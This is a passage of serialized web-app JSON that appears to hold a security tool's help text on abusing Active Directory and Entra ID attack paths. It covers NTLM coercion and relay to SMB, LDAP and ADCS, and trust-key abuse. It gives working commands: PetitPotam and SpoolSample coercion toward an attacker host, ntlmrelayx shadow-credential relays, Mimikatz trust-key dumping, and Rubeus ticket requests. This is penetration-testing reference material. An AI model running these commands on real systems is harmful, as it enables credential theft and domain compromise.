rights or impersonate other principals."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"SyncedToADUser","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may authenticate as the on-prem AD user using the Entra user’s credentials, for example by key-logging the user’s password, or by changing the Entra user’s password and waiting for the password write-back operation to complete."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may authenticate as the on-prem AD user using the Entra user’s credentials, for example by key-logging the user’s password, or by changing the Entra user’s password and waiting for the password write-back operation to complete."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"SyncedToEntraUser","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may authenticate as the synchronized Entra user using the on-prem user’s credentials, for example by dumping the user’s plain-text credential from memory, key-logging the user’s password, or by changing the on-prem user’s password and authenticating with that new password."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may authenticate as the synchronized Entra user using the on-prem user’s credentials, for example by dumping the user’s plain-text credential from memory, key-logging the user’s password, or by changing the on-prem user’s password and authenticating with that new password."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"CoerceAndRelayNTLMToSMB","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"1: Take Over the SMB Port on the Attacker Host To avoid a conflict with SMB running on the attacker-controlled Windows computer, it is necessary to takeover the SMB port. This can be achieved with smbtakeover."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["2: Start the Relay Server The NTLM relay can be executed with"," ",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/Kevin-Robertson/Inveigh","children":"Inveigh"},"_owner":null,"_store":{}},"."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["3: Coerce the Target Computer Several coercion methods are documented here:"," ",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/p0dalirius/windows-coerced-authentication-methods","children":"Windows Coerced Authentication Methods"},"_owner":null,"_store":{}},". Examples of tools include:",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/leechristensen/SpoolSample","children":"SpoolSample"},"_owner":null,"_store":{}},{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/topotam/PetitPotam","children":"PetitPotam"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["1. Start the Relay Server The NTLM relay can be executed with"," ",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py","children":"ntlmrelayx.py"},"_owner":null,"_store":{}},"."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["2. Coerce the Target Computer Several coercion methods are documented here:"," ",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/p0dalirius/windows-coerced-authentication-methods","children":"Windows Coerced Authentication Methods"},"_owner":null,"_store":{}},". Examples of tools include:",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py","children":"printerbug.py"},"_owner":null,"_store":{}},{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/topotam/PetitPotam","children":"PetitPotam"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"CoerceAndRelayNTLMToLDAP","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"1: Start the Relay Server The NTLM relay can be executed with Inveigh."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["2: Coerce the Target Computer Several coercion methods are documented here:"," ",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/p0dalirius/windows-coerced-authentication-methods","children":"Windows Coerced Authentication Methods"},"_owner":null,"_store":{}},". Examples of tools include:",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/leechristensen/SpoolSample","children":"SpoolSample"},"_owner":null,"_store":{}},{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/topotam/PetitPotam","children":"PetitPotam"},"_owner":null,"_store":{}},"To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe \"VICTIM_IP\" \"ATTACKER_NETBIOS@PORT/file.txt\""]},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["1. Start the Relay Server The NTLM relay can be executed with"," ",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py","children":"ntlmrelayx.py"},"_owner":null,"_store":{}},". To relay to LDAP and perform a Shadow Credentials attack against the target computer:",{"key":null,"ref":null,"props":{"children":"ntlmrelayx.py -t ldap://<Domain Controller IP> --shadow-credentials"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["2. Coerce the Target Computer Several coercion methods are documented here:"," ",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/p0dalirius/windows-coerced-authentication-methods","children":"Windows Coerced Authentication Methods"},"_owner":null,"_store":{}},". Examples of tools include:",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py","children":"printerbug.py"},"_owner":null,"_store":{}},{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/topotam/PetitPotam","children":"PetitPotam"},"_owner":null,"_store":{}},"To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE.",{"key":null,"ref":null,"props":{"children":"Petitpotam.py -d \"DOMAIN\" -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS@PORT/file.txt\" \"VICTIM_IP\""},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"CoerceAndRelayNTLMToLDAPS","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"1: Start the Relay Server The NTLM relay can be executed with Inveigh."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["2: Coerce the Target Computer Several coercion methods are documented here:"," ",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/p0dalirius/windows-coerced-authentication-methods","children":"Windows Coerced Authentication Methods"},"_owner":null,"_store":{}},". Examples of tools include:",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/leechristensen/SpoolSample","children":"SpoolSample"},"_owner":null,"_store":{}},{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/topotam/PetitPotam","children":"PetitPotam"},"_owner":null,"_store":{}},"To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe \"VICTIM_IP\" \"ATTACKER_NETBIOS@PORT/file.txt\""]},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["1. Start the Relay Server The NTLM relay can be executed with"," ",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py","children":"ntlmrelayx.py"},"_owner":null,"_store":{}},". To relay to LDAP and perform a Shadow Credentials attack against the target computer:",{"key":null,"ref":null,"props":{"children":"ntlmrelayx.py -t ldaps://<Domain Controller IP> --shadow-credentials"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["2. Coerce the Target Computer Several coercion methods are documented here:"," ",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/p0dalirius/windows-coerced-authentication-methods","children":"Windows Coerced Authentication Methods"},"_owner":null,"_store":{}},". Examples of tools include:",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py","children":"printerbug.py"},"_owner":null,"_store":{}},{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/topotam/PetitPotam","children":"PetitPotam"},"_owner":null,"_store":{}},"To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE.",{"key":null,"ref":null,"props":{"children":"Petitpotam.py -d \"DOMAIN\" -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS@PORT/file.txt\" \"VICTIM_IP\""},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"CoerceAndRelayNTLMToADCS","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"1: Start the Relay Server The NTLM relay can be executed with Inveigh."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["2: Coerce the Target Computer Several coercion methods are documented here:"," ",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/p0dalirius/windows-coerced-authentication-methods","children":"Windows Coerced Authentication Methods"},"_owner":null,"_store":{}},". Examples of tools include:",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/leechristensen/SpoolSample","children":"SpoolSample"},"_owner":null,"_store":{}},{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/topotam/PetitPotam","children":"PetitPotam"},"_owner":null,"_store":{}},"To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe \"VICTIM_IP\" \"ATTACKER_NETBIOS@PORT/file.txt\""]},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["1. Start the Relay Server The NTLM relay can be executed with"," ",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py","children":"ntlmrelayx.py"},"_owner":null,"_store":{}},". To relay to the enterprise CA and enroll a certificate, specify the HTTP(S) endpoint as the target and use the arguments",{"key":null,"ref":null,"props":{"children":"--adcs --template <TEMPLATE_NAME>."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["2. Coerce the Target Computer Several coercion methods are documented here:"," ",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/p0dalirius/windows-coerced-authentication-methods","children":"Windows Coerced Authentication Methods"},"_owner":null,"_store":{}},". Examples of tools include:",{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py","children":"printerbug.py"},"_owner":null,"_store":{}},{"type":"a","key":null,"ref":null,"props":{"href":"https://github.com/topotam/PetitPotam","children":"PetitPotam"},"_owner":null,"_store":{}},"To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE."]},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"ClaimSpecialIdentity","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Guest Account"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["The Guest user account allows users without a personal account to log in. The account has no password by default.",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"If enabled, anyone with AD access can log in with the Guest account."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Network Identity"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Any user or computer accessing a Windows system via a network has the Network identity in their access token."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Authentication Authority Asserted Identity"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Included in access tokens when an account is authenticated directly against a domain controller and not through Kerberos constrained delegation (service asserted identity)."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Key Trust"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["Included in access tokens when authentication is based on public key credentials via key trust objects.",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"Anyone with key trust credentials (e.g., from a Shadow Credentials attack) can obtain Key Trust identity access through PKINIT authentication."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"MFA Key Property"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["Similar to Key Trust but requires the MFA property on the key trust credentials.",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"A Shadow Credentials attack enables anyone to obtain the MFA Key Property identity access through PKINIT authentication."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"NTLM Authentication"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["Included in an access token when authentication occurs via NTLM protocol.",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"Any AD account can obtain NTLM authentication identity access, assuming NTLM is available."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Schannel Authentication"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["Included in an access token when authentication occurs via Schannel protocol.",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"Any AD account can obtain the Schannel Authentication identity, for example by performing certificate authentication over Schannel."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"This Organization Identity"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Assigned to all accounts within the same Active Directory forest and trusted forests without selective authentication."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"This Organization Certificate Identity"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["Assigned to all accounts within the same Active Directory forest and trusted forests without selective authentication, when the Kerberos PAC contains an NTLM_SUPPLEMENTAL_CREDENTIAL structure.",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"Authentication using an ADCS certificate ensures the required PAC structure."]},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"HasTrustKeys","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Step 1: Obtain Trust Keys"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Trust keys can be dumped with administrative access to a domain controller of the source domain."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"On Windows, use Mimikatz to dump the trust keys:"},"_owner":null,"_store":{}},{"key":null,"ref":null,"props":{"children":"lsadump::trust /patch"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The trust keys for the target trust account appear under \"[ Out ]\" for the target domain."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Step 2: Authenticate as the Trust Account"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The RC4 version of the trust keys serves as the RC4 Kerberos secret key for the trust account. This can be used directly to request a Kerberos Ticket-Granting Ticket (TGT)."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["The AES trust keys are not identical to the AES Kerberos secret keys of the trust account due to different salt values. However, you can derive the AES Kerberos secret keys using the cleartext trust key and tools like krbrelayx.py. (See reference:"," ",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://snovvcrash.rocks/2021/05/21/calculating-kerberos-keys.html","children":"A Note on Calculating Kerberos Keys for AD Accounts"},"_owner":null,"_store":{}}," ",")."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["When authenticating as a trust account, there are two key limitations:",{"type":"ol","key":null,"ref":null,"props":{"style":{"listStyleType":"decimal","paddingLeft":"1.5em"},"children":[{"type":"li","key":null,"ref":null,"props":{"children":"Only Kerberos authentication is supported (NTLM authentication is not possible)"},"_owner":null,"_store":{}},{"type":"li","key":null,"ref":null,"props":{"children":"Only network logins work (interactive logins such as RUNAS, console login, and RDP are not possible)"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"On Windows, use Rubeus to obtain a TGT:"},"_owner":null,"_store":{}},{"key":null,"ref":null,"props":{"children":"Rubeus.exe asktgt /user:<trust account SAMAccountName> /domain:<target domain DNS name> /rc4:<RC4 trust key> /nowrap /ptt"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"On Linux, use Impacket's getTGT.py to obtain a TGT:"},"_owner":null,"_store":{}},{"key":null,"ref":null,"props":{"children":"python getTGT.py <target domain DNS name>/<trust account SAMAccountName> -hashes : <RC4 trust key>"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}}]